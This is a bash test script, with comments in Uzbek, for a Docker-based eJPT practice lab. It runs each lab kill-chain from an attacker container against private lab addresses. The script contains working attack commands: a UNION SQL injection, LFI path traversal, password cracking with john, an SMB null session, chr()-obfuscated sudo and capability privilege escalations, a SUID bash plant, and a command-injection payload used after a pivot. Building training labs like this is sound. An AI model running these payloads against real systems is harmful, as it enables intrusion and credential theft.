#!/bin/bash
# eJPT Lab — barcha kill-chain'larni attacker konteyneridan tekshiradi.
# Ishlatish: docker compose up -d  &&  bash test-killchains.sh
set -u
A="docker exec ejpt-attacker sh -c"
pass=0; fail=0
chk(){ if echo "$2" | grep -q "$1"; then echo "  [PASS] $3"; pass=$((pass+1)); else echo "  [FAIL] $3 -- got: $(echo "$2"|tr '\n' ' '|cut -c1-120)"; fail=$((fail+1)); fi; }

echo "### 0) Host discovery + services"
OUT=$($A "nmap -sn 172.20.0.0/24 2>/dev/null | grep -oE '172.20.0.[0-9]+' | sort -u")
echo "$OUT" | sed 's/^/    /'
chk "172.20.0.10" "$OUT" "web-01 topildi"
chk "172.20.0.20" "$OUT" "linux-02 topildi"
chk "172.20.0.30" "$OUT" "smb-03 topildi"

echo "### 1) web-01: SQLi -> creds -> upload RCE -> www-data -> root"
# UNION SQLi -> sysadmin cred
SQLI=$($A "curl -s 'http://172.20.0.10/search.php?q=%25%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-'")
chk "acme02" "$SQLI" "UNION SQLi sysadmin md5crypt hashini dump qildi (crack->SSH)"
# crack the leaked md5crypt hash with john (in the container) -> SSH password
CPW=$($A "H=\$(curl -s 'http://172.20.0.10/search.php?q=%25%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-' | grep -oE 'sysadmin</td><td>[^<]+' | sed 's/.*<td>//'); rm -f /root/.john/john.pot; printf 'sysadmin:%s\n' \"\$H\" > /tmp/h.txt; john --wordlist=/root/wordlist.txt /tmp/h.txt >/dev/null 2>&1; john --show /tmp/h.txt 2>/dev/null | head -1 | cut -d: -f2")
chk "Ac3m3S3rv3r!" "$CPW" "SQLi hash -> john crack -> SSH parol"
UF=$($A "sshpass -p 'Ac3m3S3rv3r!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@172.20.0.10 'cat /var/www/html/user.txt' 2>/dev/null")
chk "EJPT{" "$UF" "web-01 USER flag (crack -> SSH foothold)"
# privesc via ssh sysadmin + sudo python3
ROOT=$($A "sshpass -p 'Ac3m3S3rv3r!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@172.20.0.10 'sudo /usr/bin/python3 -c \"import os;os.system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(46)+chr(116)+chr(120)+chr(116))\"' 2>/dev/null")
chk "EJPT{" "$ROOT" "web-01 ROOT flag (sudo python3)"

echo "### 1a) web-easy: ochiq config -> SSH deploy -> sudo bash -> root"
EC=$($A "curl -s http://172.20.0.40/config.old | grep -oE 'ssh_pass = .+'")
chk "D3ploy2024!" "$EC" "web-easy: config.old SSH cred sizdi"
EUF=$($A "sshpass -p 'D3ploy2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@172.20.0.40 'cat /home/deploy/user.txt' 2>/dev/null")
chk "EJPT{" "$EUF" "web-easy USER flag (SSH)"
ERF=$($A "sshpass -p 'D3ploy2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@172.20.0.40 'sudo /bin/bash -c \"cat /root/root.txt\"' 2>/dev/null")
chk "EJPT{" "$ERF" "web-easy ROOT flag (sudo bash)"

echo "### 1b) web-hard: LFI -> SSH webadmin -> perl cap_setuid -> root"
HL=$($A "curl -s 'http://172.20.0.50/view.php?page=../../../../opt/monitor/deploy_notes.txt' | grep -oE 'pass: .+'")
chk "W3bM0n1t0r2024!" "$HL" "web-hard: LFI SSH cred sizdi"
HUF=$($A "sshpass -p 'W3bM0n1t0r2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null webadmin@172.20.0.50 'cat /home/webadmin/user.txt' 2>/dev/null")
chk "EJPT{" "$HUF" "web-hard USER flag (LFI->SSH)"
HRF=$($A "sshpass -p 'W3bM0n1t0r2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null webadmin@172.20.0.50 'perl -e \"use POSIX qw(setuid); POSIX::setuid(0); exec chr(47).chr(98).chr(105).chr(110).chr(47).chr(99).chr(97).chr(116).chr(32).chr(47).chr(114).chr(111).chr(111).chr(116).chr(47).chr(114).chr(111).chr(111).chr(116).chr(46).chr(116).chr(120).chr(116);\"' 2>/dev/null")
chk "EJPT{" "$HRF" "web-hard ROOT flag (perl cap_setuid)"

echo "### 2) linux-02: anon FTP hint -> ssh bob -> SUID find -> root"
FTP=$($A "curl -s ftp://172.20.0.20/note_to_bob.txt")
chk "football" "$FTP" "anon FTP note (bob parol hint)"
LUF=$($A "sshpass -p football ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@172.20.0.20 'cat /home/bob/user.txt' 2>/dev/null")
chk "EJPT{" "$LUF" "linux-02 USER flag (ssh bob)"
LRF=$($A "sshpass -p football ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@172.20.0.20 \"find /home/bob/user.txt -exec /bin/sh -p -c 'cat /root/root.txt' \\;\" 2>/dev/null")
chk "EJPT{" "$LRF" "linux-02 ROOT flag (SUID find)"

echo "### 3) smb-03: null session -> creds -> ssh carol -> writable script -> root"
SMB=$($A "smbclient //172.20.0.30/public -N -c 'get credentials.txt /tmp/cr.txt' 2>/dev/null; cat /tmp/cr.txt 2>/dev/null")
chk "Fil3s3rv3r2025" "$SMB" "SMB null session creds leak"
SUF=$($A "sshpass -p Fil3s3rv3r2025 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null carol@172.20.0.30 'cat /home/carol/user.txt' 2>/dev/null")
chk "EJPT{" "$SUF" "smb-03 USER flag (ssh carol)"
# writable-script privesc: overwrite, wait for root loop, use SUID bash
$A "sshpass -p Fil3s3rv3r2025 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null carol@172.20.0.30 'echo \"cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\" > /opt/maintenance/cleanup.sh' 2>/dev/null"
sleep 24
SRF=$($A "sshpass -p Fil3s3rv3r2025 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null carol@172.20.0.30 '/tmp/rootbash -p -c \"cat /root/root.txt\"' 2>/dev/null")
chk "EJPT{" "$SRF" "smb-03 ROOT flag (writable root script -> SUID bash)"

echo "### 4) PIVOT: web-01 -> internal-04 (command injection) -> FINAL flag"
# attacker CANNOT reach 10.10.10.20 directly:
DIRECT=$($A "curl -s --max-time 5 http://10.10.10.20:8080/ 2>&1 | head -c 40; echo")
echo "    (attacker->internal to'g'ridan: '$DIRECT')"
# web-01 buzilgan -> o'sha hostdan ichki 10.10.10.20 ga command injection:
PIV=$(docker exec ejpt-web-01 sh -c "curl -s 'http://10.10.10.20:8080/ping?host=127.0.0.1;cat%20/flag.txt'")
chk "EJPT{" "$PIV" "internal-04 FINAL flag (pivot + cmd injection)"

echo ""
echo "### NATIJA: PASS=$pass  FAIL=$fail"
